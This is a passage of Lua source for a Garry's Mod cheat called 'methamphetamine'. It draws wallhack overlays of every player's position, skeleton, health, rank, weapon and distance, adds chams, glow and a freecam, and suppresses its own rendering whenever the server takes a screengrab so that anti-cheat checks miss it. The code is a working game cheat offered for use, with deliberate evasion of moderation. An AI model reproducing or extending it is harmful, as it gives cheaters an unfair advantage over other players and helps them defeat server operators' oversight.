    return MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8
end

local scrw,scrh = ScrW(),ScrH()


print("CREATING ENTITIES TABLE ")
local vguicolors = methamphetamine.colors
methamphetamine.mods["ESP"].Entities = {}
function methamphetamine.GetESPEntites()
    local returned = {}
    for k ,v in ipairs( ents.GetAll() ) do
        if methamphetamine.mods["ESP"].Entities[ v:GetClass() ] then
            print(k,v)
            returned[#returned + 1] = v
        end
    end
    return returned
end
methamphetamine.espentities = methamphetamine.GetESPEntites()

timer.Create("methamphetamine.updateentityesp", 15, 0 , function()
    methamphetamine.espentities = methamphetamine.GetESPEntites()
end)

addHook("HUDPaint","methamphetamine.entityesp",function()
    if methamphetamine.screengrab then return end
    for k , v in ipairs(methamphetamine.espentities) do
        if not IsValid(v) then table.remove(methamphetamine.espentities,k) return end
        if v:GetPos():DistToSqr(LocalPlayer:GetPos()) > methamphetamine.mods.ESP.Range*methamphetamine.mods.ESP.Range then goto skipEntityRendering end
        local entpos = (v:GetPos() + v:OBBCenter()):ToScreen()
        local text = v:GetClass()
        surface.SetFont( methamphetamine.default.font )
        surface.SetTextColor( color_white )
        local textwide,texttall = surface.GetTextSize( text)
        surface.SetTextPos( entpos.x - textwide/2,entpos.y-texttall/2 )
        surface.DrawText( text )
        ::skipEntityRendering::
    end
end)

local cachedTeamColors = {}
methamphetamine.GetTeamColor = function(iTeam)
    if not cachedTeamColors[iTeam] then
        cachedTeamColors[iTeam] = GetTeamColor(iTeam)
    end
    return cachedTeamColors[iTeam]
end

local cachedTeamNames = {}
methamphetamine.GetTeamName = function(iTeam)
    if not cachedTeamNames[iTeam] then
        cachedTeamNames[iTeam] = team.GetName(iTeam)
    end
    return cachedTeamNames[iTeam]
end

local function calculateTextOffSet( strText, strFont, iAlignX, iAlignY ) -- 1 and 4 is pretty much all i use
    iAlignX = iAlignX or 0
    iAlignY = iAlignY or 0
    surface.SetFont(strFont)
    local textWide,textTall = surface.GetTextSize(strText)
    local offsetx,offsety = 0,0
    if iAlignX == 1 then
        offsetx = offsetx - (textWide/2)
    elseif iAlignX == 2 then
        offsetx = offsetx - textWide
    end
    if iAlignY == 4 then
        offsety = offsety + textTall
    elseif iAlignY == 2 then
        offsety = offsety - (textTall/2)
    end
    return offsetx,offsety
end

local colors 
addHook("HUDPaint","methamphetamine.esp",function()
    if methamphetamine.screengrab then return end
    colors = methamphetamine.mods and methamphetamine.mods["ESP"] and methamphetamine.mods["ESP"].colors or {}

    if CurTime() - methamphetamine.lastscreengrab < 5 then
        surface.SetDrawColor( vguicolors.background )
        surface.DrawRect(ScrW() /2 - 110,0,220,30)
        surface.SetDrawColor( vguicolors.border )
        surface.DrawOutlinedRect(ScrW() / 2 - 110,0,220,30)
        surface.SetFont( methamphetamine.default.font )
        surface.SetTextColor( vguicolors.text )
        surface.SetTextPos( ScrW() / 2 - 75,8 )
        surface.DrawText("You were screengrabbed")
    end
    if not methamphetamine.mods["ESP"].MasterToggle then return end
    local rainbow = HSVToColor( (CurTime()*20)%360,1,1 )
    for k , v in ipairs( GetAllPlayers() ) do
        if v:Health() <= 0 or v == LocalPlayer then goto skiprender end
        if LocalPlayer:GetPos():DistToSqr( v:GetPos() ) > methamphetamine.mods["ESP"].Range*methamphetamine.mods["ESP"].Range then goto skiprender end
        local LEFT_MARGIN = 0
        local TOP_MARGIN = 0
        local RIGHT_MARGIN = 0
        local BOTTOM_MARGIN = 0
        local teamcolor = methamphetamine.GetTeamColor(v:Team())
        local healthcolor = Color( 255 * (1 - (v:Health() / v:GetMaxHealth())) , 255 * (v:Health()/v:GetMaxHealth()), 0 )
        local MaxX,MaxY,MinX,MinY,V1,V2,V3,V4,V5,V6,V7,V8 = getBounds( v )
        local distance = floor(sqrt(LocalPlayer:GetPos():DistToSqr(v:GetPos())))
        
        if methamphetamine.mods["ESP"].enabled["Box"] then
            if methamphetamine.mods["ESP"].colortype["Box"] == "Selected Color" then
                SetDrawColor( colors.Box or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Box"] == "Team Color" then
                SetDrawColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Box"] == "Health Color" then
                SetDrawColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Box"] == "Rainbow" then
                SetDrawColor( rainbow )
            end
            if methamphetamine.mods["ESP"].types["Box"] == "2D [None]" then
                drawSurfaceLine( MaxX, MaxY, MinX, MaxY )
                drawSurfaceLine( MaxX, MaxY, MaxX, MinY )
                drawSurfaceLine( MinX, MinY, MaxX, MinY )
                drawSurfaceLine( MinX, MinY, MinX, MaxY )
            elseif methamphetamine.mods["ESP"].types["Box"] == "3D [None]" then
                drawSurfaceLine( V4.x, V4.y, V6.x, V6.y )
                drawSurfaceLine( V1.x, V1.y, V8.x, V8.y )
                drawSurfaceLine( V6.x, V6.y, V8.x, V8.y )
                drawSurfaceLine( V4.x, V4.y, V1.x, V1.y )

        
                drawSurfaceLine( V3.x, V3.y, V5.x, V5.y )
                drawSurfaceLine( V2.x, V2.y, V7.x, V7.y )
                drawSurfaceLine( V3.x, V3.y, V2.x, V2.y )
                drawSurfaceLine( V5.x, V5.y, V7.x, V7.y )

          
                drawSurfaceLine( V3.x, V3.y, V4.x, V4.y )
                drawSurfaceLine( V2.x, V2.y, V1.x, V1.y )
                drawSurfaceLine( V7.x, V7.y, V8.x, V8.y )
                drawSurfaceLine( V5.x, V5.y, V6.x, V6.y )
            end
        end

        if methamphetamine.mods["ESP"].enabled["Skeleton"] then
            if methamphetamine.mods["ESP"].colortype["Skeleton"] == "Selected Color" then
                SetDrawColor( colors.Skeleton or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Skeleton"] == "Team Color" then
                SetDrawColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Skeleton"] == "Health Color" then
                SetDrawColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Skeleton"] == "Rainbow" then
                SetDrawColor( rainbow )
            end
            drawBones( v )
        end


        if methamphetamine.mods["ESP"].enabled["Health [Bar]"] then
            --print("Drawing health bar")
            local width = 6
            local margin = width*2
            local diff = (MaxY - MinY) - ((MaxY - MinY) * math.min( math.max(v:Health(),0) / v:GetMaxHealth(),1))
            surface.SetDrawColor( color_black )
            surface.DrawPoly({
                { x = MaxX + margin, y = MaxY  },
                { x = MaxX + width , y = MaxY },
                { x = MaxX + width, y = MinY },
                { x = MaxX + margin , y = MinY }, 
            })

            if methamphetamine.mods["ESP"].colortype["Health [Bar]"] == "Selected Color" then
                SetDrawColor( colors["Health [Bar]"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Health [Bar]"] == "Team Color" then
                SetDrawColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Health [Bar]"] == "Health Color" then
                SetDrawColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Health [Bar]"] == "Rainbow" then
                SetDrawColor( rainbow )
            end

            surface.DrawPoly({
                { x = MaxX + margin - 1, y = MaxY - 1},
                { x = MaxX + width + 1, y = MaxY - 1},
                { x = MaxX + width + 1, y = MinY + 1 + diff},
                { x = MaxX + margin - 1, y = MinY + 1 + diff}, 
            })
        end
        surface.SetFont(methamphetamine.default.font)
        local _,TEXT_MARGIN_INCREMENT = surface.GetTextSize("012376543")
        if methamphetamine.mods["ESP"].enabled["Name"] then
            if methamphetamine.mods["ESP"].colortype["Name"] == "Selected Color" then
                SetTextColor( colors["Name"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Name"] == "Team Color" then
                SetTextColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Name"] == "Health Color" then
                SetTextColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Name"] == "Rainbow" then
                SetTextColor( rainbow )
            end
            local nameRenderType = methamphetamine.mods["ESP"].types["Name"]
            local str = v.SteamName and v:SteamName() or v:Nick()
            if nameRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif nameRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif nameRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
                RIGHT_MARGIN = RIGHT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif nameRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end
        if methamphetamine.mods["ESP"].enabled["Rank"] then
            if methamphetamine.mods["ESP"].colortype["Rank"] == "Selected Color" then
                SetDrawColor( colors["Rank"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Rank"] == "Team Color" then
                SetDrawColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Rank"] == "Health Color" then
                SetDrawColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Rank"] == "Rainbow" then
                SetDrawColor( rainbow )
            end
            local rankRenderType = methamphetamine.mods["ESP"].types["Rank"]
            local str = v:GetUserGroup()
            if rankRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif rankRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif rankRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
            elseif rankRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end
        if methamphetamine.mods["ESP"].enabled["Team"] then
            if methamphetamine.mods["ESP"].colortype["Team"] == "Selected Color" then
                SetTextColor( colors["Team"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Team"] == "Team Color" then
                SetTextColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Team"] == "Health Color" then
                SetTextColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Team"] == "Rainbow" then
                SetTextColor( rainbow )
            end
            local teamRenderType = methamphetamine.mods["ESP"].types["Team"]
            local str = methamphetamine.GetTeamName(v:Team())
            if teamRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif teamRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif teamRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
            elseif teamRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end
        if methamphetamine.mods["ESP"].enabled["Health [Txt]"] then
            if methamphetamine.mods["ESP"].colortype["Health [Txt]"] == "Selected Color" then
                SetTextColor( colors["Health [Txt]"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Health [Txt]"] == "Team Color" then
                SetTextColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Health [Txt]"] == "Health Color" then
                SetTextColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Health [Txt]"] == "Rainbow" then
                SetTextColor( rainbow )
            end
            local healthRenderType = methamphetamine.mods["ESP"].types["Health [Txt]"]
            local str ="HP: "..v:Health()
            if healthRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif healthRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif healthRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
            elseif healthRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end
        if methamphetamine.mods["ESP"].enabled["Weapon"] then
            if methamphetamine.mods["ESP"].colortype["Weapon"] == "Selected Color" then
                SetTextColor( colors["Weapon"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Weapon"] == "Team Color" then
                SetTextColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Weapon"] == "Health Color" then
                SetTextColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Weapon"] == "Rainbow" then
                SetTextColor( rainbow )
            end
            local weaponRenderType = methamphetamine.mods["ESP"].types["Weapon"]
            local str = IsValid(v:GetActiveWeapon()) and v:GetActiveWeapon():GetClass() or "NONE"
            if weaponRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif weaponRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif weaponRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
            elseif weaponRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end
        if methamphetamine.mods["ESP"].enabled["Distance"] then
            if methamphetamine.mods["ESP"].colortype["Distance"] == "Selected Color" then
                SetTextColor( colors["Distance"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Distance"] == "Team Color" then
                SetTextColor( teamcolor )
            elseif methamphetamine.mods["ESP"].colortype["Distance"] == "Health Color" then
                SetTextColor( healthcolor )
            elseif methamphetamine.mods["ESP"].colortype["Distance"] == "Rainbow" then
                SetTextColor( rainbow )
            end
            local distanceRenderType = methamphetamine.mods["ESP"].types["Distance"]
            local str = "Distance: "..distance
            if distanceRenderType == "Top" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,4)
                surface.SetTextPos(x + offsetx,MinY-TOP_MARGIN-offsety)
                surface.DrawText(str)
                TOP_MARGIN = TOP_MARGIN + TEXT_MARGIN_INCREMENT
            elseif distanceRenderType == "Left" then
                local x = MinX - 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,2,1)
                surface.SetTextPos(x + offsetx,MinY-LEFT_MARGIN+offsety)
                surface.DrawText(str)
                LEFT_MARGIN = LEFT_MARGIN - TEXT_MARGIN_INCREMENT
            elseif distanceRenderType == "Right" then
                local x = MaxX + 1
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,0,1)
                surface.SetTextPos(x + offsetx,MinY-RIGHT_MARGIN+offsety)
                surface.DrawText(str)
            elseif distanceRenderType == "Bottom" then
                local x = MinX - ((MinX-MaxX)/2)
                local offsetx,offsety = calculateTextOffSet(str,methamphetamine.default.font,1,0)
                surface.SetTextPos(x + offsetx,MaxY+BOTTOM_MARGIN+offsety)
                surface.DrawText(str)
                BOTTOM_MARGIN = BOTTOM_MARGIN + TEXT_MARGIN_INCREMENT
            end
        end

        

        ::skiprender::
    end
end)


hook.Add( "PostDrawOpaqueRenderables", "methamphetamine.chams", function()
    if not methamphetamine then return end
    if methamphetamine.screengrab then return end
    if not methamphetamine.mods or not methamphetamine.mods.ESP or not methamphetamine.mods.ESP.enabled then return end

    if (methamphetamine.mods["ESP"].enabled["Chams [P.]"]   ) then 
        render.SetStencilWriteMask( 0xFF )
        render.SetStencilTestMask( 0xFF )
        render.SetStencilReferenceValue( 0 )
        render.SetStencilCompareFunction( STENCIL_ALWAYS )
        render.SetStencilPassOperation( STENCIL_KEEP )
        render.SetStencilFailOperation( STENCIL_KEEP )
        render.SetStencilZFailOperation( STENCIL_KEEP )
        render.ClearStencil()
        render.SetStencilEnable( true )
        render.SetStencilReferenceValue( 1 )
        render.SetStencilCompareFunction( STENCIL_EQUAL )
        render.SetStencilFailOperation( STENCIL_REPLACE )
    
        local champcol = color_white
        for _, ent in ipairs( GetAllPlayers() ) do
            if not ent:Alive() then goto skipdrawing end
            if LocalPlayer:GetPos():DistToSqr( ent:GetPos() ) > methamphetamine.mods["ESP"].Range*methamphetamine.mods["ESP"].Range then goto skipdrawing end
            if methamphetamine.mods["ESP"].colortype["Chams [P.]"] == "Selected Color" then
                champcol = ( colors["Chams [P.]"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Chams [P.]"] == "Rainbow" then
                champcol = HSVToColor( (CurTime()*20)%360,1,1 )
            end
            ent:DrawModel() 
            ::skipdrawing::
        end
        render.ClearBuffersObeyStencil( champcol.r,champcol.g,champcol.b, 255, false )
        render.SetStencilEnable( false )
    end

    if (methamphetamine.mods["ESP"].enabled["Chams [W.]"] or false) then 
        render.SetStencilWriteMask( 0xFF )
        render.SetStencilTestMask( 0xFF )
        render.SetStencilReferenceValue( 0 )
        render.SetStencilCompareFunction( STENCIL_ALWAYS )
        render.SetStencilPassOperation( STENCIL_KEEP )
        render.SetStencilFailOperation( STENCIL_KEEP )
        render.SetStencilZFailOperation( STENCIL_KEEP )
        render.ClearStencil()
        render.SetStencilEnable( true )
        render.SetStencilReferenceValue( 1 )
        render.SetStencilCompareFunction( STENCIL_EQUAL )
        render.SetStencilFailOperation( STENCIL_REPLACE )

        
        local champcol = color_white
        for _, ent in ipairs( GetAllPlayers() ) do
            ent = ent:GetActiveWeapon()
            if not IsValid( ent ) then goto skipdrawing end
            if LocalPlayer:GetPos():DistToSqr( ent:GetPos() ) > methamphetamine.mods["ESP"].Range*methamphetamine.mods["ESP"].Range then goto skipdrawing end
            if methamphetamine.mods["ESP"].colortype["Chams [W.]"] == "Selected Color" then
                champcol = ( colors["Chams [W.]"] or color_white )
            elseif methamphetamine.mods["ESP"].colortype["Chams [W.]"] == "Rainbow" then
                champcol = HSVToColor( (CurTime()*20)%360,1,1 )
            end
            ent:DrawModel() 
            ::skipdrawing::
        end
        render.ClearBuffersObeyStencil( champcol.r,champcol.g,champcol.b, 255, false )
        render.SetStencilEnable( false )

    end


    
end )	

addHook("PreDrawHalos","methamphetamine.halos",function()
    if not methamphetamine then return end
    if methamphetamine.screengrab then return end
    if not methamphetamine.mods or not methamphetamine.mods.ESP or not methamphetamine.mods.ESP.enabled then return end
    if not methamphetamine.mods["ESP"].enabled["Glow"] then return end


    for k , v in ipairs( GetAllPlayers() ) do
        if LocalPlayer:GetPos():DistToSqr( v:GetPos() ) > methamphetamine.mods["ESP"].Range*methamphetamine.mods["ESP"].Range then goto skipdrawing end
        local teamcolor = methamphetamine.GetTeamColor( v:Team() )
        local healthcolor = Color( 255 * (1 - (v:Health() / v:GetMaxHealth())) , 255 * (v:Health()/v:GetMaxHealth()), 0 )
        local rainbow = HSVToColor( (CurTime()*20)%360,1,1 )
        local c = color_white
        if methamphetamine.mods["ESP"].colortype["Glow"] == "Selected Color" then
            c = ( colors.Glow or color_white )
        elseif methamphetamine.mods["ESP"].colortype["Glow"] == "Team Color" then
            c = ( teamcolor )
        elseif methamphetamine.mods["ESP"].colortype["Glow"] == "Health Color" then
            c = ( healthcolor )
        elseif methamphetamine.mods["ESP"].colortype["Glow"] == "Rainbow" then
            c = ( rainbow )
        end
        AddHalo( {v} , c ,0.1 , 0.1, 0.1,true, true )
        ::skipdrawing::
    end
end)



    -- hook.Add("CreateMove", "modmenu_noclip", function( cmd )
    --     cmd:ClearMovement()
    --     cmd:ClearButtons()
    --     return true
    -- end)

    -- hook.Add( "InputMouseApply", "modmenu_noclip", function( cmd,x,y )
    --     view.angles = view.angles + Angle( y / 45 ,-x / 45, 0 )
    -- return true

local cam = LocalPlayer:GetPos() + LocalPlayer:OBBCenter()
addHook("CalcView","methamphetamien.freecam",function(ply,origin,ang,fov)
    if not methamphetamine.mods.ESP.Freecam.Enabled then return end
    local view = {
        origin = cam
    }
    if input.IsKeyDown( KEY_LSHIFT ) then speed = 35  else speed = 15  end
    if input.IsKeyDown( KEY_W ) then
        cam = cam + EyeAngles():Forward() * speed
    end
    if input.IsKeyDown( KEY_A ) then
        cam = cam - EyeAngles():Right() * speed
    end
    if input.IsKeyDown( KEY_S ) then
        cam = cam - EyeAngles():Forward() * speed
    end
    if input.IsKeyDown( KEY_D ) then
        cam = cam + EyeAngles():Right() * speed
    end
    if input.IsKeyDown( KEY_SPACE ) then
        cam = cam + EyeAngles():Up() * speed
    end
    if input.IsKeyDown( KEY_LALT ) then
        cam = cam - EyeAngles():Up() * speed
    end
    return view
end)
